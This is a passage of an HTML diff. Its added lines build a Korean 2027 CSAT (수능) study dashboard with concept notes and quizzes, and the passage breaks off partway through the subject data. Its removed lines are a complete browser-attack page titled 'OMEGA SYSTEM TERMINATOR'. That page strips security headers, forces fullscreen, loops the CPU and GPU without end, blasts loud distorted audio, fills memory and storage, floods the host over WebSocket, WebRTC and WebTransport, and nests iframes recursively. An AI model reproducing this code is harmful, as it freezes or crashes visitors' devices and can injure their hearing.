@@ -1,456 +1,852 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-    <!-- ====== 메타 태그를 통한 보안 무력화 (업그레이드: 모든 가능한 정책 무시 및 추가 취약점 유도) ====== -->
-    <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
-    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
-    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
-    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
-    <meta http-equiv="Origin-Agent-Cluster" content="false">
-    <meta http-equiv="Strict-Transport-Security" content="max-age=0">
-    <meta http-equiv="X-Frame-Options" content="ALLOWALL">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-    <meta name="referrer" content="no-referrer">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="mobile-web-app-capable" content="yes">
-    <title>⚠️ OMEGA SYSTEM TERMINATOR v15.0.0 ⚠️</title>
-
-    <!-- ====== CSS 렌더링 엔진 공격 (업그레이드: 극한 다중 애니메이션, 필터 체인, 무한 레이어) ====== -->
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-shadow: 0 0 0 100vmax rgba(0,0,0,0.5), inset 0 0 0 100vmax rgba(255,0,0,0.5), 0 0 0 100vmax rgba(0,255,0,0.5); /* 트리플 그림자 GPU 핵과부하 */
-            backdrop-filter: blur(200px) saturate(1000%) brightness(500%) contrast(1000%); /* 극한 필터 체인 */
-            animation: doom 0.01s infinite alternate, chaos 0.02s infinite, apocalypse 0.03s infinite; /* 트리플 애니메이션 */
-            will-change: transform, opacity, filter, box-shadow, background, color; /* 모든 속성 강제 변경 */
-            pointer-events: none; /* 사용자 입력 방지 */
-        }
-
-        @keyframes doom {
-            0% { transform: translate(0,0) scale(1) rotate(0deg) skew(0deg); }
-            33% { transform: translate(300px,300px) scale(5) rotate(120deg) skew(30deg); }
-            66% { transform: translate(-300px,-300px) scale(0.05) rotate(240deg) skew(-30deg); }
-            100% { transform: translate(0,0) scale(10) rotate(360deg) skew(0deg); }
-        }
-
-        @keyframes chaos {
-            0% { opacity: 1; filter: blur(0) invert(0); }
-            50% { opacity: 0; filter: blur(100px) invert(1); }
-            100% { opacity: 1; filter: blur(0) invert(0); }
-        }
-
-        @keyframes apocalypse {
-            0% { background: red; color: black; }
-            50% { background: black; color: red; }
-            100% { background: red; color: black; }
-        }
-
-        body {
-            overflow: hidden;
-            position: fixed;
-            width: 100vw;
-            height: 100vh;
-            user-select: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>2027 수능 프렙 플랫폼</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      background: radial-gradient(circle at top, #1e293b, #0f172a 60%, #020617 100%);
+      color: #e2e8f0;
+      min-height: 100vh;
+    }
+    .glass {
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid rgba(148, 163, 184, 0.2);
+      box-shadow: 0 20px 40px rgba(2, 6, 23, 0.45);
+      backdrop-filter: blur(12px);
+    }
+    .scrollbar::-webkit-scrollbar { width: 8px; }
+    .scrollbar::-webkit-scrollbar-thumb { background: #334155; border-radius: 999px; }
+    .scrollbar::-webkit-scrollbar-track { background: #0f172a; }
+  </style>
 </head>
-<body onload="document.documentElement.requestFullscreen(); document.documentElement.requestPointerLock();">
-    <!-- ====== 1. CPU 핵융합 공격 시스템 (업그레이드: 공유 메모리 원자 연산 + 무한 워커 스폰) ====== -->
-    <script>
-        // (1-A) WebAssembly CPU 초고속 소멸 (업그레이드: 공유 배열 버퍼 + 원자 무한 루프)
-        (function() {
-            const sharedBuffer = new SharedArrayBuffer(1024 * 1024);
-            const sharedArray = new Int32Array(sharedBuffer);
-            const wasmCode = new Uint8Array([
-                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 
-                0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 
-                0x00, 0x07, 0x08, 0x01, 0x04, 0x6B, 0x69, 0x6C, 0x6C, 0x00, 0x00, 
-                0x0A, 0x11, 0x01, 0x0F, 0x00, 0x03, 0x40, 0x03, 0x40, 0x03, 0x00, 0x03, 0x00, 0x0B, 0x0B, 0x0B
-            ]);
+<body class="font-sans">
+  <div class="flex min-h-screen">
+    <aside class="w-full md:w-72 glass p-6 sticky top-0 h-screen overflow-y-auto scrollbar">
+      <div class="mb-6">
+        <p class="text-indigo-300 text-xs tracking-[0.4em] uppercase">2027 CSAT</p>
+        <h1 class="text-2xl font-bold mt-2">수능 프렙 플랫폼</h1>
+        <p class="text-slate-400 text-sm mt-2">과목 필터를 선택해 학습 영역을 좁히세요.</p>
+      </div>
+      <input id="searchInput" class="w-full bg-slate-900/80 border border-slate-700 rounded-lg px-3 py-2 text-sm" placeholder="과목 검색" />
+      <div id="subjectMenu" class="mt-4 space-y-2"></div>
+    </aside>
 
-            const createWasmHell = () => {
-                Array.from({length: navigator.hardwareConcurrency * 5000}, () => {
-                    const mod = new WebAssembly.Module(wasmCode);
-                    const inst = new WebAssembly.Instance(mod, { shared: { mem: sharedBuffer } });
-                    while(true) { 
-                        inst.exports.kill(); 
-                        Atomics.add(sharedArray, 0, 1); // 원자 연산 과부하
-                    }
-                });
-            };
+    <main class="flex-1 px-6 py-8">
+      <header class="mb-8">
+        <h2 class="text-3xl font-semibold">2027 수능 전 과목 대시보드</h2>
+        <p class="text-slate-400 mt-2">카드를 눌러 단원을 선택하고 개념-퀴즈 학습을 시작하세요.</p>
+      </header>
 
-            // 0.01초마다 공격 초강화
-            let attackLevel = 1;
-            setInterval(() => {
-                attackLevel *= 5;
-                for(let i=0; i<attackLevel; i++) createWasmHell();
-            }, 10);
-        })();
+      <section id="dashboard" class="grid md:grid-cols-2 xl:grid-cols-3 gap-6"></section>
 
-        // (1-B) 오디오 컨텍스트 고주파 공격 (업그레이드: 다중 게인 노드 + 디스토션 커브)
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const gainNode = audioContext.createGain();
-        gainNode.gain.value = 1000; // 극한 볼륨
-        const distortion = audioContext.createWaveShaper();
-        distortion.curve = new Float32Array(10000).fill(1); // 디스토션 과부하
-        distortion.connect(gainNode);
-        gainNode.connect(audioContext.destination);
-        setInterval(() => {
-            for(let i=0; i<50; i++) {
-                const oscillator = audioContext.createOscillator();
-                oscillator.type = ['square', 'sawtooth', 'triangle', 'sine'][Math.floor(Math.random()*4)];
-                oscillator.frequency.setValueAtTime(10000 + Math.random()*20000, audioContext.currentTime);
-                oscillator.connect(distortion);
-                oscillator.start();
-                setTimeout(() => oscillator.stop(), 20);
-            }
-        }, 1);
-    </script>
+      <section id="studyView" class="hidden mt-10">
+        <div class="flex flex-wrap items-center justify-between gap-4 mb-6">
+          <div>
+            <p class="text-indigo-300 text-sm" id="subjectBadge">과목</p>
+            <h2 class="text-3xl font-semibold" id="studyTitle">학습 모드</h2>
+            <p class="text-slate-400" id="studySubtitle">단원을 선택해 학습을 시작하세요.</p>
+          </div>
+          <button id="backButton" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition">대시보드로</button>
+        </div>
 
-    <!-- ====== 2. GPU 초절멸 시스템 (업그레이드: 다중 캔버스 + WebGL 확장 + 컴퓨트 셰이더) ====== -->
-    <script type="module">
-        // (2-A) WebGL 3.0 프래그먼트 셰이더 지옥 (업그레이드: 다중 셰이더 + 텍스처 오버로드)
-        (function() {
-            for(let c=0; c<10; c++) { // 다중 캔버스 생성
-                const canvas = document.createElement('canvas');
-                canvas.id = 'gpu_doom_' + c;
-                canvas.width = window.innerWidth * 50;
-                canvas.height = window.innerHeight * 50;
-                document.body.appendChild(canvas);
+        <div class="grid lg:grid-cols-[1.1fr_1.2fr] gap-6">
+          <div class="glass rounded-2xl p-6 flex flex-col min-h-[520px]">
+            <div class="flex items-center justify-between mb-4">
+              <h3 class="text-xl font-semibold">개념 노트</h3>
+              <span class="text-xs text-indigo-300" id="conceptCount">0개</span>
+            </div>
+            <div id="conceptList" class="space-y-4 overflow-y-auto pr-2 scrollbar"></div>
+          </div>
 
-                const gl = canvas.getContext('webgl2', { antialias: false, powerPreference: 'high-performance' });
-                gl.getExtension('EXT_color_buffer_float');
-                gl.getExtension('OES_texture_float_linear');
+          <div class="glass rounded-2xl p-6 flex flex-col min-h-[520px]">
+            <div class="flex items-center justify-between mb-4">
+              <h3 class="text-xl font-semibold">퀴즈 스테이션</h3>
+              <div class="text-sm text-slate-300">점수: <span id="scoreDisplay">0/0</span></div>
+            </div>
+            <div id="quizArea" class="flex-1">
+              <p class="text-slate-400">단원을 선택하면 퀴즈가 표시됩니다.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
 
-                const shaderCode = `#version 300 es
-                    precision highp float;
-                    out vec4 fragColor;
-                    uniform sampler2D tex;
-                    void main() {
-                        for(int i=0; i<10000000; i++) { // 루프 100배 증가
-                            vec4 color = texture(tex, gl_FragCoord.xy / vec2(10000.0));
-                            fragColor = vec4(
-                                sin(float(gl_FragCoord.x * i) * color.r * tan(float(i))), 
-                                cos(float(gl_FragCoord.y * i) * color.g * sin(float(i))), 
-                                tan(float(i) * color.b * cos(float(i))), 
-                                1.0
-                            );
-                        }
-                    }`;
-                
-                const shader = gl.createShader(gl.FRAGMENT_SHADER);
-                gl.shaderSource(shader, shaderCode);
-                gl.compileShader(shader);
-                // 무한 렌더링 루프 with compute
-                function render() {
-                    gl.drawArrays(gl.TRIANGLES, 0, 100000); // 대규모 드로우
-                    requestAnimationFrame(render);
-                }
-                render();
-            }
-        })();
-
-        // (2-B) WebGPU VRAM 초고속 포화 (업그레이드: 다중 디바이스 + 컴퓨트 파이프라인)
-        (async () => {
-            try {
-                const adapter = await navigator.gpu.requestAdapter({ powerPreference: 'high-performance' });
-                const device = await adapter.requestDevice({ label: 'doom' });
-                const bufferSize = 10 ** 12 * 5; // 5TB 시도
-                const buffer = device.createBuffer({
-                    size: bufferSize,
-                    usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST | GPUBufferUsage.INDIRECT
-                });
-                const computeShader = device.createComputePipeline({
-                    layout: 'auto',
-                    compute: {
-                        module: device.createShaderModule({
-                            code: ` @compute @workgroup_size(64) fn main() { while(true) {} } `
-                        }),
-                        entryPoint: 'main'
-                    }
-                });
-                setInterval(() => {
-                    device.queue.writeBuffer(buffer, 0, new Uint8Array(bufferSize).fill(Math.random()*255));
-                    const commandEncoder = device.createCommandEncoder();
-                    const passEncoder = commandEncoder.beginComputePass();
-                    passEncoder.setPipeline(computeShader);
-                    passEncoder.dispatchWorkgroups(1000000); // 극한 컴퓨트 디스패치
-                    passEncoder.end();
-                    device.queue.submit([commandEncoder.finish()]);
-                }, 0.1);
-            } catch(e) {
-                console.error("GPU 파괴 실패:", e);
-            }
-        })();
-    </script>
-
-    <!-- ====== 3. 메모리 대학살 시스템 (업그레이드: 무한 할당 루프 + WeakRef 방지) ====== -->
-    <script>
-        // (3-A) RAM 초고속 소모 (업그레이드: 글로벌 참조 + 크립토 체인)
-        const globalKillers = [];
-        setInterval(() => {
-            while(true) {
-                try {
-                    const buf = new ArrayBuffer(1024 * 1024 * 1000); // 1GB씩 무한
-                    globalKillers.push(buf);
-                    crypto.subtle.digest('SHA-512', buf)
-                        .then(hash => crypto.subtle.digest('SHA-256', hash))
-                        .then(() => {});
-                } catch(e) { break; }
-            }
-        }, 100);
-
-        // (3-B) Storage 동시 공격 (업그레이드: 퀴즈 스토리지 + 캐시 API)
-        navigator.storage.persist().then(() => {
-            caches.open('doom-cache').then(cache => {
-                setInterval(() => {
-                    cache.add(new Request(`data:application/octet-stream;base64,${btoa(new ArrayBuffer(10**9 * 5))}`));
-                }, 10);
-            });
-            setInterval(() => {
-                for(let i=0; i<50; i++) {
-                    localStorage.setItem(`kill_${Date.now()}_${i}`, new Blob([new ArrayBuffer(10 ** 9 * 5)])); // 5GB
-                    sessionStorage.setItem(`die_${Date.now()}_${i}`, new ArrayBuffer(10 ** 9 * 5));
-                }
-                indexedDB.open('armageddon', 1).onsuccess = e => {
-                    const db = e.target.result;
-                    const tx = db.transaction('doom', 'readwrite');
-                    const store = tx.objectStore('doom');
-                    for(let i=0; i<20; i++) {
-                        store.add(new Blob([new ArrayBuffer(10 ** 9 * 2)]), Date.now() + i);
-                    }
-                };
-            }, 10);
-        });
-    </script>
-
-    <!-- ====== 4. 네트워크 핵폭격 시스템 (업그레이드: 다중 프로토콜 + 데이터 플러드) ====== -->
-    <script type="module">
-        // (4-A) WebTransport 초초고속 UDP 폭격 (업그레이드: 1000개 트랜스포트 + QUIC 오버로드)
-        (async () => {
-            for(let i=0; i<1000; i++) {
-                try {
-                    const transport = new WebTransport(`quic-transport://${location.host}/doom${i}`);
-                    await transport.ready;
-                    const writer = transport.datagrams.writable.getWriter();
-                    setInterval(() => {
-                        writer.write(new Uint8Array(10 ** 9).fill(0xFF)); // 1GB UDP 플러드
-                    }, 0.01);
-                } catch(e) {}
-            }
-        })();
-
-        // (4-B) WebSocket/WebRTC 6666개 연결 (업그레이드: 6666개, 무한 바이너리 전송)
-        Array.from({length: 6666}, () => {
-            const ws = new WebSocket(`wss://${location.host}/ws`);
-            ws.onopen = () => setInterval(() => ws.send(new Uint8Array(10**8)), 0.1);
-            const pc = new RTCPeerConnection();
-            const channel = pc.createDataChannel('doom');
-            channel.onopen = () => setInterval(() => channel.send(new Uint8Array(10**8)), 0.1);
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            fetch(location.href, { method: 'POST', body: new Blob([new ArrayBuffer(10**8)]) }); // 추가 fetch 플러드
-        });
-    </script>
-
-    <!-- ====== 5. DOM 트리 붕괴 시스템 (업그레이드: 극한 재귀 + MutationObserver 오버로드) ====== -->
-    <script>
-        // (5-A) 자가복제 iframe 지옥 (업그레이드: 10레벨 재귀 + shadow DOM)
-        let iframeCount = 0;
-        function createHell() {
-            const div = document.createElement('div');
-            const shadow = div.attachShadow({mode: 'open'});
-            const iframe = document.createElement('iframe');
-            iframe.srcdoc = `
-                <script>
-                    function recurse(depth) {
-                        if(depth > 0) {
-                            for(let i=0; i<50; i++) {
-                                const d = document.createElement('div');
-                                d.attachShadow({mode: 'open'}).innerHTML = '<iframe srcdoc="' + btoa('<script>recurse(' + (depth-1) + ');</script>') + '"></iframe>';
-                                document.body.appendChild(d);
-                            }
-                        } else {
-                            while(1){}
-                        }
-                    }
-                    recurse(10);
-                <\/script>
-            `;
-            shadow.appendChild(iframe);
-            document.body.appendChild(div);
-            
-            if(iframeCount++ > 100) {
-                document.body.innerHTML += '<div style="display:none">' + 'X'.repeat(10**8) + '</div>';
-            }
-            setTimeout(createHell, 1);
+  <script>
+    const CSAT_DATA = {
+      "국어": {
+        "독서": {
+          concepts: [
+            { title: "정보 구조 분석", content: "설명적 글은 문제-해결 구조, 비교 구조, 인과 구조로 조직된다. 독자는 문단별 중심 문장을 확인하고, 접속어를 통해 논지 전개를 추적해야 한다. 정보 구조를 파악하면 세부 내용의 위계를 정리할 수 있다." },
+            { title: "논증 독해", content: "논증 글은 주장과 근거, 전제를 구분해 읽어야 한다. 귀납과 연역, 유추 논증의 차이를 이해하면 근거의 타당성을 판단할 수 있으며, 숨은 전제가 무엇인지 추론하는 것이 핵심이다." },
+            { title: "자료 해석", content: "도표와 그래프는 수치의 관계를 보여준다. 증가율과 비율, 절대량을 구분해 읽고, 그래프의 축과 단위를 확인해야 오해를 줄인다. 글과 자료의 연계를 확인하면 복합 지문의 핵심을 잡을 수 있다." }
+          ],
+          quizzes: [
+            { q: "설명적 글에서 비교 구조를 파악할 때 가장 중요한 단서는?", options: ["비유 표현", "대조 접속어", "감탄사", "의성어", "반복 구절"], answer: 1, explanation: "비교 구조는 그러나, 반면과 같은 대조 접속어가 핵심 단서다." },
+            { q: "논증에서 전제와 결론의 관계를 가장 잘 설명한 것은?", options: ["전제는 결론을 뒷받침", "전제는 결론과 무관", "전제는 결론을 부정", "전제는 사례만 제시", "전제는 감정 표현"], answer: 0, explanation: "전제는 결론이 성립하도록 논리적 기반을 제공한다." },
+            { q: "그래프 해석 시 가장 먼저 확인해야 할 요소는?", options: ["색상", "축과 단위", "범례 위치", "제목 글꼴", "배경색"], answer: 1, explanation: "축과 단위를 확인해야 수치의 의미를 정확히 해석할 수 있다." }
+          ]
+        },
+        "문학": {
+          concepts: [
+            { title: "서술자의 시점", content: "문학 작품에서 서술자의 시점은 사건을 전달하는 관점이다. 1인칭은 주관적이고 내면 서술에 강하며, 3인칭은 객관적 관찰을 가능하게 한다. 시점 변화는 주제와 인물 이해에 결정적 영향을 준다." },
+            { title: "갈등 구조", content: "갈등은 인물 내부의 심리 갈등, 인물 간 대립, 사회·자연과의 충돌로 나뉜다. 갈등의 유형을 파악하면 작품의 주제와 인물 변화 과정을 이해할 수 있으며, 결말의 의미를 해석하는 핵심이 된다." },
+            { title: "표현 기법", content: "비유, 상징, 반어, 과장 등은 정서와 주제를 강화한다. 특히 상징은 작품 전체의 의미망을 형성하며, 반복은 분위기와 리듬을 강화한다. 표현 기법을 통해 작품의 미적 효과를 분석할 수 있다." }
+          ],
+          quizzes: [
+            { q: "1인칭 시점의 특징으로 가장 적절한 것은?", options: ["전지적 서술", "객관적 묘사", "내면 서술 강화", "사건 누락", "시간 왜곡"], answer: 2, explanation: "1인칭은 화자의 내면을 직접 드러내 주관적 서술이 강하다." },
+            { q: "갈등 유형 중 인물 내부의 고민과 가치 충돌은?", options: ["외적 갈등", "내적 갈등", "사회 갈등", "자연 갈등", "사건 갈등"], answer: 1, explanation: "내적 갈등은 인물의 심리적 고민과 가치 충돌이다." },
+            { q: "상징의 기능으로 옳은 것은?", options: ["사실 전달", "의미 응축", "시간 정리", "화자 교체", "대사 축소"], answer: 1, explanation: "상징은 작품의 의미를 응축해 전달한다." }
+          ]
+        },
+        "화법과 작문": {
+          concepts: [
+            { title: "토론 구성", content: "토론은 주장-근거-반박의 구조로 진행된다. 논제를 명확히 하고, 쟁점별로 근거를 제시한 뒤 상대 논지를 검토하는 과정이 필요하다. 토론 윤리는 경청과 논점 유지, 자료의 신뢰성 확보가 핵심이다." },
+            { title: "설득적 글쓰기", content: "설득 글은 주장, 근거, 반론 대응으로 구성된다. 독자의 가치와 이해관계를 고려해 논리적 근거와 정서적 호소를 균형 있게 배치해야 한다. 논리적 연결어의 사용은 글의 설득력을 높인다." },
+            { title: "보고서 작성", content: "보고서는 목적, 방법, 결과, 결론의 구조로 작성된다. 객관적 자료와 근거를 중심으로 서술하고, 출처를 명확히 제시해야 신뢰성을 확보할 수 있다. 표와 그래프는 핵심 내용을 압축해 전달한다." }
+          ],
+          quizzes: [
+            { q: "토론에서 논점 일탈을 방지하기 위해 필요한 태도는?", options: ["감정적 반응", "경청과 쟁점 확인", "개인 공격", "주제 전환", "침묵"], answer: 1, explanation: "경청과 쟁점 확인이 논점 유지에 핵심이다." },
+            { q: "설득 글에서 반론 대응의 효과는?", options: ["논리 약화", "신뢰도 상승", "주제 이탈", "자료 축소", "독자 무시"], answer: 1, explanation: "반론 대응은 주장의 신뢰성을 높인다." },
+            { q: "보고서 작성에서 반드시 필요한 요소는?", options: ["감정 표현", "출처 표기", "비유 사용", "대사 삽입", "은유 과장"], answer: 1, explanation: "보고서는 객관성을 위해 출처 표기가 필수다." }
+          ]
+        },
+        "언어와 매체": {
+          concepts: [
+            { title: "음운 변동", content: "음운 변동은 발음을 쉽게 하거나 의미를 구별하기 위해 발생한다. 된소리되기, 자음 동화, 구개음화 등 유형을 구분해야 하며, 표기와 발음 차이를 정확히 이해하는 것이 중요하다." },
+            { title: "높임 표현", content: "높임 표현은 주체, 객체, 청자 높임으로 나뉘며, '-시-' 선어말 어미나 특수 어휘를 활용한다. 상황과 관계에 맞는 높임 수준을 선택하는 것이 국어 화용의 핵심이다." },
+            { title: "매체 언어", content: "매체 언어는 디지털 환경에서 속도와 상호작용성이 강화된 언어다. 축약어, 이모티콘, 해시태그는 의미를 압축하지만 오해 위험도 존재하므로 맥락과 윤리 의식을 함께 고려해야 한다." }
+          ],
+          quizzes: [
+            { q: "음운 변동의 유형이 아닌 것은?", options: ["교체", "탈락", "첨가", "축약", "확대"], answer: 4, explanation: "음운 변동은 교체·탈락·첨가·축약으로 분류된다." },
+            { q: "주체 높임 표현에 사용되는 요소는?", options: ["-겠-", "-시-", "-다", "-구나", "-라"], answer: 1, explanation: "'-시-'는 주체 높임 선어말 어미다." },
+            { q: "매체 언어의 부정적 영향은?", options: ["정보 확산", "상호작용", "오해와 혐오 표현", "표현 다양성", "참여 확대"], answer: 2, explanation: "맥락 부족으로 오해와 혐오 표현이 확대될 수 있다." }
+          ]
         }
-        createHell();
+      },
+      "수학": {
+        "수학Ⅰ": {
+          concepts: [
+            { title: "지수법칙", content: "지수법칙은 a^m·a^n=a^(m+n), a^m/a^n=a^(m-n) 등으로 정리된다. 지수법칙을 정확히 활용하면 지수 함수와 로그식의 변형이 수월해지고, 복잡한 식의 구조를 단순화할 수 있다." },
+            { title: "로그의 성질", content: "로그는 지수의 역연산이며, log_a(xy)=log_a x+log_a y, log_a x^k=k log_a x가 성립한다. 밑 변환 공식은 밑이 다른 로그를 비교할 때 유용하다. 정의역 조건을 항상 점검해야 한다." },
+            { title: "등비수열", content: "등비수열은 일정한 공비를 가지며, 합 공식 S_n=a(r^n-1)/(r-1)로 계산한다. |r|<1일 때 무한등비급수는 수렴한다. 공비와 첫째항을 바탕으로 일반항과 합을 추론할 수 있다." }
+          ],
+          quizzes: [
+            { q: "지수법칙에서 a^m/a^n은?", options: ["a^(m+n)", "a^(m-n)", "a^(n-m)", "a^(mn)", "a^(m/n)"], answer: 1, explanation: "같은 밑의 나눗셈은 지수를 뺀다." },
+            { q: "로그 정의역 조건으로 옳은 것은?", options: ["x<0", "x=0", "x>0", "x는 모든 실수", "x=1"], answer: 2, explanation: "로그는 x>0에서만 정의된다." },
+            { q: "무한등비급수가 수렴하려면?", options: ["r>1", "r=1", "|r|<1", "r<0", "r=0"], answer: 2, explanation: "공비의 절댓값이 1보다 작아야 한다." }
+          ]
+        },
+        "수학Ⅱ": {
+          concepts: [
+            { title: "함수의 극한", content: "극한은 x가 특정 값에 가까워질 때 함수값이 수렴하는 값을 의미한다. 좌극한과 우극한이 같아야 극한이 존재하며, 불연속점 유형을 판별할 때 핵심 도구가 된다." },
+            { title: "미분의 정의", content: "미분은 lim_{h→0}(f(x+h)-f(x))/h로 정의되며 변화율을 나타낸다. 도함수의 부호는 함수의 증가·감소를 판단하고, 극값을 찾는 데 활용된다." },
+            { title: "적분의 개념", content: "적분은 누적량과 넓이를 의미하며 미분의 역연산이다. 정적분은 구간 내 면적을 계산하고, 부정적분은 원함수를 구한다. 그래프의 부호를 고려해 넓이를 해석해야 한다." }
+          ],
+          quizzes: [
+            { q: "극한이 존재하려면?", options: ["좌극한만 존재", "우극한만 존재", "좌우 극한이 동일", "함수값이 0", "무한 발산"], answer: 2, explanation: "좌극한과 우극한이 같아야 극한이 존재한다." },
+            { q: "도함수의 부호가 양수면 함수는?", options: ["감소", "증가", "정지", "불연속", "평균"], answer: 1, explanation: "도함수 양수는 증가를 의미한다." },
+            { q: "정적분의 의미는?", options: ["접선 기울기", "누적 면적", "함수 합성", "좌표 이동", "축 이동"], answer: 1, explanation: "정적분은 구간의 누적량, 면적을 나타낸다." }
+          ]
+        },
+        "확률과 통계": {
+          concepts: [
+            { title: "경우의 수", content: "순열과 조합은 경우의 수를 계산하는 기본 도구다. 순열은 순서를 고려하고 조합은 순서를 고려하지 않는다. 수능에서는 조건이 포함된 경우의 수 문제를 정확히 해석하는 것이 중요하다." },
+            { title: "확률의 기본", content: "확률은 사건이 일어날 가능성을 나타내며 0과 1 사이 값이다. 덧셈정리와 곱셈정리를 활용해 독립사건과 종속사건의 확률을 계산한다. 조건부 확률은 정보가 주어진 상황에서의 확률이다." },
+            { title: "통계적 추정", content: "표본을 통해 모집단을 추정하는 과정에서 표본 평균과 분산을 활용한다. 신뢰 구간과 표본 오차 개념을 이해하면 통계 결과의 해석을 정확히 할 수 있다." }
+          ],
+          quizzes: [
+            { q: "조합의 특징으로 옳은 것은?", options: ["순서 고려", "순서 무시", "중복 허용", "항상 0", "음수 가능"], answer: 1, explanation: "조합은 순서를 고려하지 않는다." },
+            { q: "독립사건 A, B의 확률은?", options: ["P(A)+P(B)", "P(A)P(B)", "P(A)-P(B)", "P(A)/P(B)", "P(B)/P(A)"], answer: 1, explanation: "독립사건의 곱셈정리를 적용한다." },
+            { q: "표본 평균의 역할은?", options: ["모집단 추정", "확률 무시", "사건 정의", "순열 계산", "빈도 제거"], answer: 0, explanation: "표본 평균은 모집단 평균을 추정한다." }
+          ]
+        },
+        "미적분": {
+          concepts: [
+            { title: "합성함수 미분", content: "합성함수 미분은 체인 룰을 사용한다. 외부 함수의 도함수에 내부 함수의 도함수를 곱해 계산하며, 복잡한 함수의 변화율을 구할 때 핵심이다." },
+            { title: "부분적분", content: "부분적분은 곱 형태의 함수를 분해하여 적분한다. ∫udv=uv-∫vdu 공식을 활용해 계산 순서를 선택해야 하며, 반복 적용이 필요할 수 있다." },
+            { title: "곡선의 길이", content: "곡선의 길이는 미분을 기반으로 한 공식으로 계산한다. 주어진 함수의 도함수를 이용해 구간에서의 길이를 구하며, 그래프의 형태와 정의역을 고려해야 한다." }
+          ],
+          quizzes: [
+            { q: "체인 룰의 핵심은?", options: ["곱셈", "합성함수 미분", "적분", "극한", "대칭"], answer: 1, explanation: "체인 룰은 합성함수 미분에 사용된다." },
+            { q: "부분적분 공식은?", options: ["∫udv=uv-∫vdu", "∫udv=uv+∫vdu", "∫udv=u+v", "∫udv=∫u·v", "∫udv=uv"], answer: 0, explanation: "부분적분 공식은 uv-∫vdu이다." },
+            { q: "곡선의 길이를 구할 때 필요한 것은?", options: ["도함수", "이산 확률", "로그 변환", "급수", "행렬"], answer: 0, explanation: "곡선의 길이는 도함수를 사용한 공식으로 계산한다." }
+          ]
+        },
+        "기하": {
+          concepts: [
+            { title: "벡터의 내적", content: "벡터의 내적은 두 벡터의 크기와 끼인각을 이용해 계산한다. 내적이 0이면 두 벡터는 직교하며, 내적을 통해 투영 길이와 각도를 구할 수 있다." },
+            { title: "공간 좌표", content: "공간 좌표계에서 점과 직선, 평면의 방정식을 다룬다. 방향 벡터와 법선 벡터를 활용해 직선과 평면의 관계를 분석하고, 거리 계산 문제를 해결한다." },
+            { title: "원의 방정식", content: "원의 방정식은 (x-a)^2+(y-b)^2=r^2 형태로 나타난다. 중심과 반지름을 파악하면 접선 조건, 교점 계산 문제를 해결할 수 있으며, 좌표 기하 문제의 기본이 된다." }
+          ],
+          quizzes: [
+            { q: "내적이 0이면 두 벡터는?", options: ["평행", "직교", "같음", "역방향", "무관"], answer: 1, explanation: "내적이 0이면 직교한다." },
+            { q: "평면의 방정식에 필요한 것은?", options: ["법선 벡터", "속도", "시간", "확률", "순열"], answer: 0, explanation: "평면은 법선 벡터로 정의된다." },
+            { q: "원의 중심을 찾을 때 기준이 되는 식은?", options: ["x^2+y^2=1", "(x-a)^2+(y-b)^2=r^2", "y=mx+b", "ax+by+c=0", "x+y=0"], answer: 1, explanation: "원은 중심과 반지름으로 표현된다." }
+          ]
+        }
+      },
+      "영어": {
+        "영어": {
+          concepts: [
+            { title: "독해 주제 파악", content: "영어 지문은 반복되는 핵심어와 결론 문장을 통해 주제를 파악한다. 문단별 요지를 먼저 정리하면 전체 논지 흐름을 쉽게 파악할 수 있고, 세부 정보는 주제를 뒷받침하는 역할임을 기억해야 한다." },
+            { title: "문장 삽입", content: "문장 삽입 문제는 지시어와 연결어를 통해 앞뒤 문장의 논리 관계를 확인한다. 비교, 대조, 인과 표현을 찾고, 지시어가 가리키는 대상이 무엇인지 추적하면 위치를 찾기 쉽다." },
+            { title: "문법 핵심", content: "주어-동사 일치, 시제 일치, 관계사 구문은 수능 문법의 핵심이다. 문장 구조를 파악해 주절과 종속절의 시제를 맞추고, 관계대명사의 생략 여부를 판단해야 한다." }
+          ],
+          quizzes: [
+            { q: "주제 파악에서 가장 중요한 단서는?", options: ["수식어", "반복 핵심어", "부정어", "숫자", "형용사"], answer: 1, explanation: "반복 핵심어가 주제를 드러낸다." },
+            { q: "문장 삽입 시 지시어의 역할은?", options: ["문법 오류", "연결 대상 표시", "동사 강조", "시제 변경", "문장 축약"], answer: 1, explanation: "지시어는 앞뒤 내용을 연결한다." },
+            { q: "시제 일치의 기본은?", options: ["주절-종속절 시제 일치", "동일 시제 금지", "현재만 사용", "미래만 사용", "과거 금지"], answer: 0, explanation: "주절과 종속절의 시제를 논리적으로 맞춘다." }
+          ]
+        }
+      },
+      "한국사": {
+        "한국사": {
+          concepts: [
+            { title: "고대 국가 형성", content: "고조선과 부여, 삼한은 철기 문화와 함께 성장했다. 법과 제도, 경제 기반이 확립되면서 정치 권력이 강화되었고, 이러한 흐름은 삼국의 성립과 발전으로 이어졌다." },
+            { title: "조선의 통치 체제", content: "조선은 성리학을 이념으로 삼아 중앙 집권 체제를 강화했다. 6조 직계제와 의정부 서사제, 8도 체제 등 제도적 정비를 통해 왕권과 관료 체제를 확립했다." },
